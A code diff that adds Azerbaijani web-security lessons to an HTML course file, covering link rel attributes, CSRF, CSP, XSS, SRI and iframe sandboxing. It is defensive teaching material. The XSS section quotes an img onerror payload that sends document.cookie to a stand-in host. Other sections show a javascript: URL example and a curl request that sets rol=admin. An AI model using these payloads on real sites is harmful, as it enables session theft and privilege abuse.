@@ -367,6 +367,27 @@ export const html: Lesson[] = [
             ["Link ilə button nə vaxt işlədilir?", "Ünvan dəyişirsə — a; səhifədə əməliyyatdırsa (aç, göndər, sil) — button."],
             ["rel=noopener nə edir?", "Yeni səhifənin window.opener-ə çıxışını kəsir."],
           ]},
+          { t: "h", text: "Təhlükəsiz linklər: rel və təhlükəli sxemlər" },
+          { t: "code", lang: "html", code: `<!-- Xarici link: opener və Referer sızmasının qarşısını al -->
+<a href="https://example.com" target="_blank" rel="noopener noreferrer">Xarici sayt</a>
+
+<!-- İstifadəçi şərhindəki link: SEO spam-ı və səlahiyyət ötürülməsini kəs -->
+<a href="https://example.com" rel="nofollow ugc noopener">Şərh müəllifinin saytı</a>
+
+<!-- TƏHLÜKƏLİ: istifadəçi bu dəyəri javascript:alert(document.cookie) edə bilər -->
+<a href="javascript:alert(document.cookie)">Kliklə</a>` },
+          { t: "list", items: [
+            "noopener — açılan səhifənin window.opener ilə sənin tabına çıxışını kəsir (reverse tabnabbing).",
+            "noreferrer — Referer başlığını göndərmir (və noopener davranışını da verir). Daxili URL-lərdəki gizli tokenləri sızdırmamaq üçün vacibdir.",
+            "Sxem ağ siyahısı: istifadəçidən gələn URL-i yalnız http:, https: (və lazım gəlsə mailto:) icazə ver; javascript:, data:, vbscript: sxemlərini rədd et.",
+            "Yoxlamanı mətn üzərində deyil, URL parser ilə et: new URL(girish).protocol — «JaVaScRiPt:» və ya boşluq/yeni sətirlə gizlədilmiş variantlar regex-i aldada bilər.",
+          ]},
+          { t: "mistake", lang: "js", wrong: `if (url.startsWith("http")) link.href = url; // "httpevil:..." və ya "http.evil.com" keçir`, right: `const u = new URL(url, location.origin);
+if (u.protocol === "https:" || u.protocol === "http:") link.href = u.href;`, why: "startsWith ilə yoxlama çox kobuddur. URL-i parser ilə ayrıştırıb protokolu dəqiq müqayisə et." },
+          { t: "qa", items: [
+            ["Reverse tabnabbing nədir?", "target=_blank ilə açılan sayt window.opener.location-u dəyişib orijinal tabı saxta giriş səhifəsinə yönləndirir. rel=noopener bunu bağlayır (müasir brauzerlər target=_blank üçün onu default edir, amma açıq yazmaq sığortadır)."],
+            ["Niyə javascript: URL-i təhlükəlidir?", "Klik zamanı səhifənin kontekstində kod icra olunur — bu, XSS-dir. CSP də onu bloklaya bilər, amma əsas müdafiə sxem ağ siyahısıdır."],
+          ]},
         ],
       },
       {
@@ -738,6 +759,39 @@ export const html: Lesson[] = [
             ["GET və POST fərqi?", "GET məlumatı URL-də göndərir, idempotentdir, keşlənir. POST gövdədə göndərir, vəziyyəti dəyişən əməliyyatlar üçündür."],
             ["label-i input-a bağlamağın iki yolu?", "for=\"id\" ilə və ya input-u label-in içinə qoymaqla."],
           ]},
+          { t: "h", text: "Forma təhlükəsizliyi: autocomplete, CSRF, metod" },
+          { t: "code", lang: "html", code: `<form action="/giris" method="post" autocomplete="on">
+  <input type="hidden" name="csrf_token" value="SERVER_TƏRƏFİNDƏN_VERİLƏN_TOKEN">
+
+  <label>Email <input type="email" name="email" autocomplete="username" required></label>
+  <label>Parol <input type="password" name="parol" autocomplete="current-password" required></label>
+
+  <!-- Yeni parol: brauzer güclü parol təklif edə bilsin -->
+  <input type="password" name="yeni" autocomplete="new-password" minlength="12">
+
+  <!-- Birdəfəlik kod: parol meneceri doldurmasın -->
+  <input type="text" name="otp" autocomplete="one-time-code" inputmode="numeric">
+
+  <button type="submit">Daxil ol</button>
+</form>` },
+          { t: "list", items: [
+            "Həssas məlumatı (parol, token) heç vaxt GET ilə göndərmə: URL brauzer tarixçəsində, server loglarında və Referer-də qalır. Dəyişiklik edən əməliyyatlar POST/PUT/DELETE olmalıdır.",
+            "autocomplete=\"current-password\" / \"new-password\" / \"one-time-code\" parol menecerlərinə kömək edir və təhlükəsizdir. Parol menecerini bloklamaq (autocomplete=off) istifadəçini zəif parola itələyir.",
+            "CSRF (Cross-Site Request Forgery): istifadəçi sənin saytında giriş edibsə, zərərli sayt onun adından gizli forma göndərə bilər, çünki brauzer cookie-ni avtomatik əlavə edir.",
+            "CSRF müdafiəsi: server tərəfi anti-CSRF token (hidden input), cookie-də SameSite=Lax/Strict, və Origin/Referer başlığının yoxlanması. GET sorğusu heç vaxt vəziyyəti dəyişməməlidir.",
+            "Fayl yükləyirsənsə: enctype=\"multipart/form-data\" və serverdə fayl tipi, ölçü, uzantı yoxlanması; accept atributu yalnız UX üçündür, təhlükəsizlik deyil.",
+          ]},
+          { t: "warn", text: "Hidden input, readonly, disabled, maxlength və required istifadəçi tərəfindən DevTools ilə dəyişdirilə bilər. Qiymət, rol, istifadəçi id-si kimi dəyərləri heç vaxt formadan «etibarlı» qəbul etmə — serverdə yenidən hesabla və yoxla." },
+          { t: "mistake", lang: "html", wrong: `<form action="/hesab/sil?id=42" method="get">
+  <button>Hesabı sil</button>
+</form>`, right: `<form action="/hesab/sil" method="post">
+  <input type="hidden" name="csrf_token" value="...">
+  <button>Hesabı sil</button>
+</form>`, why: "GET ilə silmə <img src=\"/hesab/sil?id=42\"> kimi sadə bir teqlə başqa saytdan tetiklənə bilər. Vəziyyəti dəyişən əməliyyat POST + CSRF token tələb etməlidir." },
+          { t: "qa", items: [
+            ["CSRF ilə XSS arasında fərq nədir?", "XSS — zərərli kod sənin səhifəndə icra olunur. CSRF — zərərli sayt istifadəçinin brauzerini sənin serverinə istənməyən sorğu göndərməyə məcbur edir. XSS CSRF tokenini də oğurlaya bilər."],
+            ["SameSite cookie nə verir?", "SameSite=Lax/Strict cookie-nin üçüncü tərəf saytından gələn sorğularla göndərilməsini məhdudlaşdırır və CSRF-i xeyli azaldır; amma token ilə birlikdə dərin müdafiə (defense in depth) kimi işlət."],
+          ]},
         ],
       },
       {
@@ -919,6 +973,34 @@ export const html: Lesson[] = [
             ["canonical nə üçündür?", "Eyni məzmunun bir neçə URL-i olanda əsas ünvanı göstərir ki, axtarış sistemi onları dublikat saymasın və «çəki» bir ünvanda toplansın."],
             ["noindex ilə robots.txt Disallow fərqi?", "Disallow taramanı qadağan edir, amma səhifə başqa linklərdən indeksə düşə bilər. noindex indeksdən çıxarır — bunun üçün robot səhifəni oxuya bilməlidir, yəni ikisini birlikdə işlətmək səhvdir."],
             ["SPA-da SEO problemi nədir?", "HTML boş gəlir, məzmun JS-dən sonra yaranır. Robot gec/natamam görür, sosial şəbəkə botları isə JS-i ümumiyyətlə icra etmir. Həll: SSR və ya statik generasiya."],
+          ]},
+          { t: "h", text: "CSP, Referrer-Policy və clickjacking" },
+          { t: "p", text: "Content-Security-Policy (CSP) brauzerə səhifənin hansı mənbələrdən skript, stil, şəkil və s. yükləyə biləcəyini bildirir. Uğurlu XSS hücumunun təsirini kəskin azaldır. Ən güclü yol HTTP cavab başlığıdır; <meta http-equiv> ilə də verilə bilər, amma məhdudiyyətləri var." },
+          { t: "code", lang: "html", code: `<head>
+  <meta charset="utf-8">
+  <!-- CSP meta ilə: yalnız öz mənbən və bir CDN -->
+  <meta http-equiv="Content-Security-Policy"
+        content="default-src 'self'; script-src 'self' https://cdn.example.com; img-src 'self' data:; object-src 'none'; base-uri 'self'">
+
+  <!-- Referer sızmasını azalt -->
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+</head>` },
+          { t: "code", lang: "http", code: `# Başlıqla (üstün yol) — meta ilə mümkün olmayanlar da burada işləyir
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+X-Frame-Options: DENY` },
+          { t: "list", items: [
+            "meta CSP-də frame-ancestors, report-uri və sandbox direktivləri İŞLƏMİR — clickjacking müdafiəsi yalnız HTTP başlığı ilə mümkündür.",
+            "Clickjacking: hücumçu sənin səhifəni şəffaf iframe-də öz saytında göstərib istifadəçini gizli düymələrə kliklətir. Müdafiə: Content-Security-Policy: frame-ancestors 'none' (və ya 'self') + köhnə brauzerlər üçün X-Frame-Options: DENY.",
+            "'unsafe-inline' və 'unsafe-eval' CSP-nin əsas faydasını silir. İnline skriptlər üçün nonce (hər sorğuda təsadüfi) və ya hash istifadə et.",
+            "Yeni CSP-ni əvvəl Content-Security-Policy-Report-Only rejimində sına — pozuntuları bloklamadan hesabatla.",
+            "X-Content-Type-Options: nosniff brauzerin faylın tipini «təxmin etməsinin» qarşısını alır (məs. yüklənmiş mətn faylının skript kimi icrası).",
+          ]},
+          { t: "tip", text: "CSP «yoxlama siyahısı» deyil, dərin müdafiə qatıdır. Əsas müdafiə yenə də çıxışın düzgün escape olunmasıdır; CSP isə xəta olduqda ziyanı məhdudlaşdırır." },
+          { t: "qa", items: [
+            ["CSP-ni nə üçün meta ilə deyil, başlıqla verirlər?", "Başlıq HTML parse olunmazdan əvvəl tətbiq olunur, bütün direktivləri dəstəkləyir (frame-ancestors, sandbox, report-uri) və meta teqi yerləşdiyi yerdən əvvəlki məzmuna təsir etmir."],
+            ["Clickjacking-dən necə qorunmaq olar?", "frame-ancestors 'none' və ya 'self' CSP direktivi, ehtiyat kimi X-Frame-Options. Həssas əməliyyatlarda əlavə təsdiq (parol, 2FA) də faydalıdır."],
           ]},
         ],
       },
@@ -1144,6 +1226,30 @@ export const html: Lesson[] = [
             ["setCustomValidity necə işləyir?", "Boş olmayan sətir verəndə sahə invalid sayılır (customError) və həmin mətn mesaj kimi göstərilir. Boş sətir xətanı silir. Hər input hadisəsində yenidən hesablanmalıdır."],
             [":invalid ilə :user-invalid fərqi?", ":invalid səhifə yüklənən kimi boş required sahələrə də tətbiq olunur. :user-invalid yalnız istifadəçi sahə ilə işlədikdən və ya submit cəhdindən sonra."],
           ]},
+          { t: "h", text: "Client validasiyası təhlükəsizlik deyil" },
+          { t: "p", text: "required, pattern, min/max, type=\"email\" kimi atributlar istifadəçiyə sürətli geri bildirim verir — UX üçündür. Hücumçu brauzeri tamamilə yan keçib birbaşa curl, Postman və ya skriptlə serverə istənilən məlumatı göndərə bilər. Ona görə hər qayda serverdə də təkrar yoxlanmalıdır." },
+          { t: "code", lang: "bash", code: `# HTML formasındakı required, maxlength və pattern bu sorğuda iştirak etmir:
+curl -X POST https://sayt.az/qeydiyyat \\
+  -d "email=bu-email-deyil" \\
+  -d "yas=-5" \\
+  -d "rol=admin"` },
+          { t: "list", items: [
+            "Ağ siyahı (allowlist) yanaşması: icazə verilən formatı təsvir et, qalan hər şeyi rədd et. Qara siyahı (blocklist) həmişə yan keçilir.",
+            "Server yoxlaması: tip, uzunluq, aralıq, format, icazə verilən dəyərlər (enum) və biznes qaydaları (yaş ≥ 18, unikal email).",
+            "Validasiya ≠ sanitizasiya ≠ escape: validasiya girişi qəbul/rədd edir; escape çıxış kontekstinə görə (HTML, SQL, URL) edilir. Hər biri ayrı problemi həll edir.",
+            "Xəta mesajları: «Email və ya parol yanlışdır» — hansının səhv olduğunu bildirmə (istifadəçi adlarının sadalanmasının qarşısı).",
+            "Sorğu sürətini məhdudlaşdır (rate limiting) və CAPTCHA/lockout ilə brute-force-un qarşısını al.",
+          ]},
+          { t: "mistake", lang: "js", wrong: `// Yalnız brauzerdə
+if (yas < 18) { alert("Yaş kifayət deyil"); return; }
+fetch("/qeydiyyat", { method: "POST", body: JSON.stringify({ yas, rol }) });`, right: `// Server (Node nümunəsi)
+if (!Number.isInteger(body.yas) || body.yas < 18) return res.status(400).end();
+const icazeli = new Set(["istifadeci", "muellim"]);
+if (!icazeli.has(body.rol)) return res.status(400).end();`, why: "Brauzer kodu hücumçunun nəzarətindədir. Etibarlı qərar yalnız serverdə verilir; rol kimi sahələri istifadəçidən qəbul etmək əvəzinə serverdə təyin et." },
+          { t: "qa", items: [
+            ["Niyə həm client, həm server validasiyası lazımdır?", "Client — sürətli UX; server — həqiqi təhlükəsizlik. Client tərəfi bypass edilə bilər, ona görə server tərəfi məcburidir."],
+            ["pattern atributu ilə təhlükəsizlik təmin olunurmu?", "Xeyr. O, yalnız brauzerdə formanın göndərilməsini bloklayır; DevTools və ya birbaşa HTTP sorğusu onu keçir."],
+          ]},
         ],
       },
       {
@@ -1275,6 +1381,36 @@ export const html: Lesson[] = [
             ["innerHTML ilə textContent fərqi?", "innerHTML sətri HTML kimi parse edib düyünlər yaradır (XSS riski, yavaş). textContent hər şeyi bir mətn düyünü kimi yazır — təhlükəsiz və sürətli."],
             ["DOMContentLoaded və load fərqi?", "Birincisi DOM ağacı qurulanda, ikincisi bütün asılı resurslar (şəkil, CSS, iframe) yüklənəndə baş verir."],
           ]},
+          { t: "h", text: "XSS: istifadəçi məlumatını HTML kimi yazma" },
+          { t: "p", text: "Cross-Site Scripting (XSS) istifadəçi tərəfindən idarə olunan mətnin HTML/JS kimi şərh olunması nəticəsində baş verir. Hücumçu skriptini səhifəyə yeridir və o, istifadəçinin cookie-sinə, tokenlərinə və hərəkətlərinə çıxış alır. Üç növü var: Stored (bazada saxlanır), Reflected (URL-dən əks olunur), DOM-based (yalnız client JS-də baş verir)." },
+          { t: "code", lang: "js", code: `const sherh = new URLSearchParams(location.search).get("s");
+
+// TƏHLÜKƏLİ: sherh = <img src=x onerror="fetch('//zerer.az?c='+document.cookie)">
+div.innerHTML = sherh;
+
+// TƏHLÜKƏSİZ: mətn kimi yazılır, HTML parse olunmur
+div.textContent = sherh;
+
+// Atribut/element yaradarkən də API işlət
+const a = document.createElement("a");
+a.textContent = "Profil";
+a.href = "/profil/" + encodeURIComponent(istifadeciAdi);` },
+          { t: "list", items: [
+            "Təhlükəli «sink»-lər: innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, setTimeout(string), on* atributları, javascript: URL-lər.",
+            "Çıxışı kontekstə görə escape et: HTML mətnində < > & \" ', atributda dırnaq, URL-də encodeURIComponent, JS içində JSON.stringify. Eyni escape hər yerdə işləmir.",
+            "HTML yazmaq həqiqətən lazımdırsa (zəngin mətn redaktoru) — yoxlanılmış sanitizer işlət (məs. DOMPurify); özün regex ilə yazma.",
+            "Müasir şablon çərçivələri (React, Next.js, Vue) default olaraq mətni escape edir; təhlükə dangerouslySetInnerHTML / v-html kimi «çıxış qapılarında» yaranır.",
+            "HttpOnly cookie JavaScript-in sessiya cookie-sinə çıxışını bağlayır; XSS-i aradan qaldırmır, amma oğurlanan məlumatın həcmini azaldır.",
+            "Trusted Types (CSP: require-trusted-types-for 'script') təhlükəli sink-lərə yalnız yoxlanılmış dəyərlərin yazılmasını məcbur edir.",
+          ]},
+          { t: "mistake", lang: "js", wrong: `list.innerHTML += "<li>" + istifadeciMetni + "</li>";`, right: `const li = document.createElement("li");
+li.textContent = istifadeciMetni;
+list.append(li);`, why: "Konkatenasiya istifadəçi mətnini markup-a çevirir. DOM API və textContent ilə mətn həmişə məlumat kimi qalır, kod kimi icra olunmur." },
+          { t: "warn", text: "Girişi «təmizləyib» bazaya yazmaq (məsələn < simvolunu silmək) etibarlı müdafiə deyil. Məlumatı olduğu kimi saxla, göstərdiyin yerdə kontekstə uyğun escape et." },
+          { t: "qa", items: [
+            ["innerHTML ilə textContent fərqi təhlükəsizlik baxımından nədir?", "innerHTML mətni HTML kimi parse edir və skript icrasına yol aça bilər; textContent isə mətni olduğu kimi, markup olmadan yazır."],
+            ["Stored və Reflected XSS fərqi?", "Stored-da zərərli məzmun serverdə saxlanır və hər baxan istifadəçiyə çatır; Reflected-də URL və ya sorğu parametri cavabda əks olunur və hücumçu qurbanı həmin linkə kliklətməlidir."],
+          ]},
         ],
       },
       {
@@ -1390,6 +1526,28 @@ export const html: Lesson[] = [
             ["LCP-ni necə yaxşılaşdırarsan?", "TTFB-ni azalt (keş/CDN), render-bloklayan CSS/JS-i azalt, LCP şəklini HTML-ə qoy + fetchpriority=high + düzgün ölçü/format (AVIF/WebP), lazy yükləmə."],
             ["CLS-in əsas səbəbləri?", "Ölçüsü verilməyən şəkil/iframe/reklam, mövcud məzmunun üstünə dinamik əlavə olunan bloklar, şrift dəyişməsi (FOUT). Həll: width/height və ya aspect-ratio, yer ayırmaq, font-display + size-adjust."],
             ["preload ilə prefetch fərqi?", "preload — cari səhifəyə mütləq lazım olan resurs, yüksək prioritet. prefetch — növbəti səhifə üçün ola bilsin lazım olacaq, aşağı prioritet, boş vaxtda."],
+          ]},
+          { t: "h", text: "Subresource Integrity (SRI) və üçüncü tərəf skriptlər" },
+          { t: "p", text: "CDN-dən yüklənən skript və stil faylı ələ keçirilərsə, hücumçu minlərlə saytda kod icra edə bilər (supply chain hücumu). SRI brauzerə faylın gözlənilən heş-ini deyir; uyğun gəlməyəndə fayl icra olunmur." },
+          { t: "code", lang: "html", code: `<script src="https://cdn.example.com/lib@1.4.2/lib.min.js"
+        integrity="sha384-BURAYA_FAYLIN_HESI"
+        crossorigin="anonymous"
+        defer></script>
+
+<link rel="stylesheet" href="https://cdn.example.com/lib@1.4.2/lib.min.css"
+      integrity="sha384-..." crossorigin="anonymous">` },
+          { t: "code", lang: "bash", code: `# Heşi yaratmaq (faylın özü üzərindən)
+openssl dgst -sha384 -binary lib.min.js | openssl base64 -A` },
+          { t: "list", items: [
+            "integrity yalnız dəyişməz (versiyaya bağlı) URL-lərlə mənalıdır; /latest/ kimi dəyişən ünvanda hər yenilənmədə sayt sınır.",
+            "crossorigin=\"anonymous\" CORS sorğusu edir; CDN uyğun Access-Control-Allow-Origin göndərməlidir, əks halda integrity yoxlaması uğursuz olur.",
+            "Mümkündürsə kritik skriptləri öz serverindən ver; hər üçüncü tərəf skript (analitika, çat, reklam) səhifədə tam icazə ilə işləyir.",
+            "Üçüncü tərəf sayını azalt, CSP ilə mənbələri məhdudlaşdır, lazımsız skriptləri sil.",
+            "SRI Google Analytics kimi tez-tez dəyişən skriptlər üçün praktik deyil — bunu risk kimi qiymətləndir.",
+          ]},
+          { t: "qa", items: [
+            ["SRI hansı hücumdan qoruyur?", "CDN və ya paylama kanalı ələ keçirildikdə faylın dəyişdirilməsindən: heş uyğun gəlmirsə brauzer faylı yükləməz."],
+            ["SRI-dən yalnız integrity yazmaq kifayətdirmi?", "Başqa origin üçün crossorigin atributu da lazımdır, və CDN CORS başlığı verməlidir."],
           ]},
         ],
       },
@@ -1530,6 +1688,33 @@ export const html: Lesson[] = [
             ["rel=\"noopener\" nə üçündür?", "Yeni tabda açılan səhifənin window.opener vasitəsilə əvvəlki tabı idarə etməsinin (məs. fişinq səhifəsinə yönləndirməsinin) qarşısını alır."],
             ["Kod review-da HTML-də nəyə baxırsan?", "Semantika və başlıq iyerarxiyası, klaviatura/ekran oxuyucu əlçatanlığı, forma label və validasiyası, şəkil ölçüləri və yükləmə strategiyası, escape olunmayan istifadəçi məzmunu, kənar skriptlər."],
             ["XSS-ə qarşı qatlı müdafiə?", "1) Çıxışda kontekstə uyğun escape, 2) innerHTML əvəzinə textContent / təmizləyici (DOMPurify), 3) CSP + Trusted Types, 4) cookie-lərdə HttpOnly, 5) etibarsız məzmun üçün sandbox iframe."],
+          ]},
+          { t: "h", text: "iframe təhlükəsizliyi: sandbox və allow" },
+          { t: "p", text: "Üçüncü tərəf məzmunu (video, xəritə, ödəniş formu, istifadəçi tərəfindən göndərilmiş HTML) iframe ilə yerləşdirilir. Default olaraq iframe geniş imkanlara malikdir; onu «ən az imtiyaz» prinsipi ilə məhdudlaşdırmaq lazımdır." },
+          { t: "code", lang: "html", code: `<!-- Maksimum məhdudiyyət: boş sandbox hər şeyi bağlayır (skript, forma, popup, eyni origin) -->
+<iframe src="https://example.com/widget" sandbox title="Widget"></iframe>
+
+<!-- Yalnız lazım olanı aç -->
+<iframe src="https://video.example.com/embed/abc"
+        sandbox="allow-scripts allow-same-origin allow-presentation"
+        allow="fullscreen; picture-in-picture"
+        referrerpolicy="no-referrer"
+        loading="lazy"
+        title="Dərs videosu"></iframe>
+
+<!-- İstifadəçi məzmunu: başqa origin-də və skriptsiz -->
+<iframe srcdoc="..." sandbox></iframe>` },
+          { t: "list", items: [
+            "sandbox bütün imkanları bağlayır; allow-scripts, allow-forms, allow-popups, allow-same-origin kimi token-lərlə seçilmiş imkanlar geri açılır.",
+            "allow-scripts + allow-same-origin birlikdə, iframe SƏNİN origin-indəndirsə, təhlükəlidir: iframe içindəki skript sandbox atributunu özü silə bilər. Yalnız başqa origin-dən olan məzmun üçün birgə işlət.",
+            "allow atributu (Permissions Policy) kamera, mikrofon, geolokasiya, ödəniş kimi güclü API-lərə icazəni idarə edir; default olaraq verməmək daha yaxşıdır.",
+            "Başqa tərəfin səni iframe-ə salmasını qadağan etmək üçün öz səhifən üçün frame-ancestors 'none' (CSP) və ya X-Frame-Options göndər; CSP frame-src ilə hansı saytları iframe-də göstərə biləcəyini məhdudlaşdır.",
+            "title atributu həm əlçatanlıq, həm kontekst üçün vacibdir.",
+          ]},
+          { t: "mistake", lang: "html", wrong: `<iframe src="/istifadeci-yukledi.html" sandbox="allow-scripts allow-same-origin"></iframe>`, right: `<iframe src="https://usercontent.sayt.az/f/123" sandbox="allow-scripts"></iframe>`, why: "Eyni origin-də allow-scripts və allow-same-origin birgə sandbox-u mənasız edir. İstifadəçi məzmununu ayrı domendən (usercontent) və yalnız lazımi token ilə göstər." },
+          { t: "qa", items: [
+            ["iframe sandbox nə edir?", "iframe-in imkanlarını (skript, forma, popup, eyni origin, naviqasiya) default olaraq bağlayır; icazələr token ilə seçilir."],
+            ["Clickjacking-i kim, harada dayandırır?", "Səni iframe-ə salınmaqdan qorumaq üçün SƏNİN serverin frame-ancestors / X-Frame-Options başlığı göndərməlidir; iframe-in sandbox-ı isə sənin içinə yerləşdirdiyin məzmunu məhdudlaşdırır."],
           ]},
         ],
       },
